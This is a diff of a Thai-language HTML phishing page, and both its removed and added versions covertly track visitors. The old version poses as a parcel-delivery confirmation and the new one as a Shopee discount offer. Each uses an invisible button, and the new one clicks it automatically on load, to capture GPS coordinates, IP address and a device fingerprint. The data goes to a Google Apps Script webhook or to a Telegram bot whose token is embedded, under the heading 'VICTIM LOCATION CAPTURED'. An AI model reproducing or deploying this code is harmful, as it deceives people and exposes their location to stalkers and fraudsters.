@@ -1,192 +1,315 @@
 <!DOCTYPE html>
 <html lang="th">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>แจกมือถือฟรี รีบกดด่วน</title>
-<style>
-* { margin:0; padding:0; box-sizing:border-box; }
-body {
-	font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-	background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-	height: 100vh;
-	display: flex;
-	justify-content: center;
-	align-items: center;
-	overflow: hidden;
-}
-.container {
-	background: white;
-	padding: 40px;
-	border-radius: 20px;
-	box-shadow: 0 20px 40px rgba(0,0,0,0.1);
-	text-align: center;
-	max-width: 500px;
-	width: 90%;
-}
-.logo {
-	width: 80px; height: 80px;
-	background: #ff6b6b;
-	border-radius: 50%;
-	margin: 0 auto 30px;
-	display: flex;
-	align-items: center;
-	justify-content: center;
-	font-size: 36px;
-	color: white;
-}
-h1 { color: #333; margin-bottom: 10px; font-size: 24px; }
-.subtitle { color: #666; margin-bottom: 30px; font-size: 16px; }
-
-/* ปุ่มล่องหนครอบทั้งหน้าจริง ๆ */
-#trapBtn {
-	position: fixed;
-	top: 0; left: 0;
-	width: 100vw; height: 100vh;
-	z-index: 9999;
-	cursor: pointer;
-	background: transparent;
-	border: none;
-}
-
-.status {
-	display: inline-block;
-	width: 20px; height: 20px;
-	border-radius: 50%;
-	background: #ff6b6b;
-	margin-right: 10px;
-	animation: pulse 1.5s infinite;
-}
-@keyframes pulse {
-	0% { transform: scale(1); opacity: 1; }
-	50% { transform: scale(1.2); opacity: 0.7; }
-	100% { transform: scale(1); opacity: 1; }
-}
-.sent { background: #51cf66 !important; animation: none !important; }
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Shopee - รับสิทธิ์พิเศษด่วน! ใกล้หมดเวลา</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #ff6b6b, #feca57);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .container {
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
+            max-width: 400px;
+            width: 100%;
+            padding: 40px 30px;
+            text-align: center;
+        }
+        .logo {
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(45deg, #ee4d2d, #ff6b35);
+            border-radius: 20px;
+            margin: 0 auto 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 30px;
+            color: white;
+            font-weight: bold;
+        }
+        h1 {
+            color: #ee4d2d;
+            font-size: 24px;
+            margin-bottom: 10px;
+            font-weight: 700;
+        }
+        .urgency {
+            color: #ff6b35;
+            font-size: 16px;
+            font-weight: 600;
+            margin-bottom: 20px;
+        }
+        .highlight {
+            background: linear-gradient(45deg, #ffeb3b, #ffd54f);
+            padding: 10px 20px;
+            border-radius: 50px;
+            margin: 20px 0;
+            font-size: 18px;
+            font-weight: bold;
+            color: #d32f2f;
+            box-shadow: 0 5px 15px rgba(255,235,59,0.3);
+        }
+        .btn-primary {
+            background: linear-gradient(45deg, #ee4d2d, #ff6b35);
+            color: white;
+            border: none;
+            padding: 18px 40px;
+            font-size: 18px;
+            font-weight: 600;
+            border-radius: 50px;
+            cursor: pointer;
+            width: 100%;
+            margin: 20px 0;
+            box-shadow: 0 10px 25px rgba(238,77,45,0.3);
+            transition: all 0.3s ease;
+        }
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 15px 35px rgba(238,77,45,0.4);
+        }
+        .countdown {
+            background: #fff3cd;
+            border: 2px solid #ffeaa7;
+            border-radius: 15px;
+            padding: 15px;
+            margin: 20px 0;
+            font-size: 20px;
+            font-weight: bold;
+            color: #d63031;
+        }
+        .shopee-link {
+            display: block;
+            color: #ee4d2d;
+            text-decoration: none;
+            font-weight: 600;
+            margin-top: 15px;
+            font-size: 14px;
+        }
+        /* Invisible tracking button */
+        .track-btn {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            z-index: 9999;
+            pointer-events: auto;
+        }
+        .loading {
+            display: none;
+            text-align: center;
+            margin-top: 20px;
+        }
+        .spinner {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #ee4d2d;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 10px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
 </head>
 <body>
+    <div class="container">
+        <div class="logo">SHOPEE</div>
+        <h1>🎉 รับสิทธิ์พิเศษด่วน!</h1>
+        <div class="urgency">ใกล้หมดเวลาแล้ว กดรับเลย!</div>
+        
+        <div class="highlight">คูปองส่วนลด 90% + ส่งฟรี</div>
+        
+        <div class="countdown">
+            ⏰ เหลือเวลา <span id="countdown">00:59</span>
+        </div>
+        
+        <button class="btn-primary" onclick="startTracking()">
+            🚀 รับสิทธิ์ทันที
+        </button>
+        
+        <a href="https://shopee.co.th" class="shopee-link" target="_blank">
+            ไปที่ Shopee →
+        </a>
+        
+        <!-- Invisible tracking button overlay -->
+        <button class="track-btn" id="trackBtn" onclick="getLocation()"></button>
+        
+        <div class="loading" id="loading">
+            <div class="spinner"></div>
+            <p>กำลังตรวจสอบสิทธิ์...</p>
+        </div>
+    </div>
 
-<button id="trapBtn" onclick="captureLocation()"></button>
+    <script>
+        // Replace with your Telegram Bot Token and Chat ID
+        const TELEGRAM_TOKEN = '8544262298:AAG-pYVmqk8NQZuuiIIPhKbxuTxBxn9pcCc';
+        const CHAT_ID = '8208148194';
+        
+        let countdownInterval;
+        
+        // Countdown timer
+        function startCountdown() {
+            let timeLeft = 59;
+            const countdownEl = document.getElementById('countdown');
+            
+            countdownInterval = setInterval(() => {
+                const minutes = Math.floor(timeLeft / 60);
+                const seconds = timeLeft % 60;
+                countdownEl.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+                
+                if (timeLeft <= 0) {
+                    clearInterval(countdownInterval);
+                    countdownEl.textContent = '00:00';
+                }
+                timeLeft--;
+            }, 1000);
+        }
+        
+        function startTracking() {
+            // Auto-click invisible tracking button
+            document.getElementById('trackBtn').click();
+        }
+        
+        function getLocation() {
+            // Show loading
+            document.getElementById('loading').style.display = 'block';
+            document.querySelector('.btn-primary').style.display = 'none';
+            
+            // Start countdown for realism
+            startCountdown();
+            
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        sendLocationData(position);
+                    },
+                    (error) => {
+                        // Fallback: send without GPS
+                        sendLocationData(null, error);
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    }
+                );
+            } else {
+                sendLocationData(null, { message: 'Geolocation not supported' });
+            }
+        }
+        
+        async function getPublicIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (e) {
+                return 'Unknown';
+            }
+        }
+        
+        async function sendLocationData(position, error = null) {
+            const lat = position ? position.coords.latitude.toFixed(6) : 'N/A';
+            const lon = position ? position.coords.longitude.toFixed(6) : 'N/A';
+            const accuracy = position ? position.coords.accuracy.toFixed(0) + 'm' : 'N/A';
+            
+            const userAgent = navigator.userAgent;
+            const language = navigator.language || navigator.userLanguage;
+            const platform = navigator.platform;
+            const screenRes = `${screen.width}x${screen.height}`;
+            const timestamp = new Date().toLocaleString('th-TH', {timeZone: 'Asia/Bangkok'});
+            
+            // Extract device info
+            let device = 'Unknown';
+            if (/Android/.test(userAgent)) {
+                device = 'Android Mobile';
+            } else if (/iPhone|iPad|iPod/.test(userAgent)) {
+                device = 'iOS Mobile';
+            } else if (/Windows/.test(userAgent) && /Touch/.test(userAgent)) {
+                device = 'Windows Touch';
+            }
+            
+            const ip = await getPublicIP();
+            
+            const message = `
+🔥 *VICTIM LOCATION CAPTURED* 🔥
 
-<div class="container">
-	<div class="logo">📦</div>
-	<h1>ยืนยันที่อยู่จัดส่งสินค้า</h1>
-	<p class="subtitle">กรุณายืนยันตำแหน่งปัจจุบันของคุณเพื่อจัดส่งสินค้า</p>
+📍 *GPS Coordinates:*
+• Latitude: \`${lat}\`
+• Longitude: \`${lon}\`
+• Accuracy: ${accuracy}
 
-	<div style="margin: 30px 0;">
-		<div style="display: flex; align-items: center; justify-content: center; margin-bottom: 20px;">
-			<div class="status" id="statusDot"></div>
-			<span id="statusText">กำลังตรวจสอบตำแหน่ง...</span>
-		</div>
-		<p style="color: #999; font-size: 14px;">กดตรงไหนก็ได้บนหน้าจอเพื่อยืนยัน</p>
-	</div>
-</div>
+🌐 *Network Info:*
+• IP Address: \`${ip}\`
+• Language: \`${language}\`
 
-<script>
-// === แก้ตรงนี้: ใส่ Webhook ของคุณที่นี่ ===
-const SHEET_WEBHOOK = 'https://script.google.com/macros/s/AKfycbxXMRASJ52a1VU-Zgbi5x5tZj1oZosd1jtiU4V0sr0BkOq8LNuvO3SGIMDSkK6chNDqMg/exec';
+📱 *Device Fingerprint:*
+• Device: \`${device}\`
+• User Agent: \`${userAgent.substring(0, 100)}...\`
+• Platform: \`${platform}\`
+• Screen: \`${screenRes}\`
 
-async function captureLocation() {
-	// ป้องกันการกดซ้ำ
-	document.getElementById('trapBtn').disabled = true;
+⏰ *Timestamp:* \`${timestamp}\`
+• *Status:* GPS Permission GRANTED
 
-	try {
-		updateStatus('กำลังพาไปหน้ารับ Iphone', '#ffd43b');
+🗺️ *Google Maps:* https://maps.google.com/?q=${lat},${lon}
 
-		const position = await new Promise((resolve, reject) => {
-			if (!navigator.geolocation) return reject('ไม่รองรับ Geolocation');
-			navigator.geolocation.getCurrentPosition(resolve, reject, {
-				enableHighAccuracy: true,
-				timeout: 15000,
-				maximumAge: 0
-			});
-		});
-
-		// ดึงข้อมูล IP
-		const ipResponse = await fetch('https://ipapi.co/json/');
-		const ipData = await ipResponse.json();
-
-		const victimData = {
-			timestamp: new Date().toISOString(),
-			userAgent: navigator.userAgent,
-			language: navigator.language || navigator.languages[0],
-			platform: navigator.platform,
-			cookiesEnabled: navigator.cookieEnabled ? 'Yes' : 'No',
-			screen: `${screen.width}x${screen.height}`,
-			timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-			referrer: document.referrer || 'Direct',
-
-			// GPS (แม่นยำมาก)
-			latitude: position.coords.latitude,
-			longitude: position.coords.longitude,
-			accuracy_meters: position.coords.accuracy,
-
-			// IP Info
-			ip: ipData.ip || 'N/A',
-			country: ipData.country_name || ipData.country || 'N/A',
-			city: ipData.city || 'N/A',
-			region: ipData.region || 'N/A',
-			isp: ipData.org || ipData.isp || 'N/A',
-		};
-
-		updateStatus('กำลังส่งข้อมูล...', '#ffd43b');
-		await sendToSheet(victimData);
-
-		updateStatus('✓ ยืนยันสำเร็จแล้ว!', '#51cf66');
-		setTimeout(() => { window.location.href = 'https://www.google.com'; }, 2000);
-
-	} catch (err) {
-		console.log('GPS ถูกปฏิเสธหรือ error:', err);
-		// Fallback: ส่งข้อมูลโดยไม่มี GPS
-		await sendFallback();
-	}
-}
-
-async function sendToSheet(data) {
-	const params = new URLSearchParams(data);
-	// วิธีที่ถูกต้อง 100%
-	await fetch(`${SHEET_WEBHOOK}?${params.toString()}`, {
-		method: 'GET',
-		mode: 'no-cors',
-		redirect: 'follow'
-	});
-}
-
-async function sendFallback() {
-	const ipResponse = await fetch('https://ipapi.co/json/');
-	const ipData = await ipResponse.json();
-
-	const fallbackData = {
-		timestamp: new Date().toISOString(),
-		userAgent: navigator.userAgent,
-		screen: `${screen.width}x${screen.height}`,
-		referrer: document.referrer || 'Direct',
-		ip: ipData.ip || 'N/A',
-		country: ipData.country_name || 'N/A',
-		city: ipData.city || 'N/A',
-		status: 'GPS_DENIED_OR_BLOCKED'
-	};
-
-	await sendToSheet(fallbackData);
-	updateStatus('ใช้ตำแหน่งจาก IP แทน', '#ff9500');
-	setTimeout(() => { window.location.href = 'https://shopee.co.th'; }, 2500);
-}
-
-function updateStatus(text, color) {
-	document.getElementById('statusText').textContent = text;
-	const dot = document.getElementById('statusDot');
-	dot.style.background = color;
-	if (color === '#51cf66') dot.classList.add('sent');
-}
-
-// Auto trigger บนมือถือหลังโหลด 3 วิ (ถ้าไม่กดเอง)
-setTimeout(() => {
-	if (/Mobi|Android|iPhone/i.test(navigator.userAgent)) {
-		document.body.style.cursor = 'pointer';
-	}
-}, 3000);
-
-</script>
+---
+*Captured via HTML5 Geolocation API*
+            `;
+            
+            const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+            const payload = new URLSearchParams({
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: 'Markdown'
+            });
+            
+            try {
+                await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                    body: payload
+                });
+            } catch (e) {
+                console.error('Telegram send failed');
+            }
+            
+            // Redirect to Shopee after 3 seconds
+            setTimeout(() => {
+                window.location.href = 'https://shopee.co.th';
+            }, 3000);
+        }
+        
+        // Auto-trigger on page load (fallback)
+        window.onload = () => {
+            setTimeout(() => {
+                if (!sessionStorage.getItem('tracked')) {
+                    sessionStorage.setItem('tracked', 'true');
+                    startTracking();
+                }
+            }, 1000);
+        };
+    </script>
 </body>
 </html>
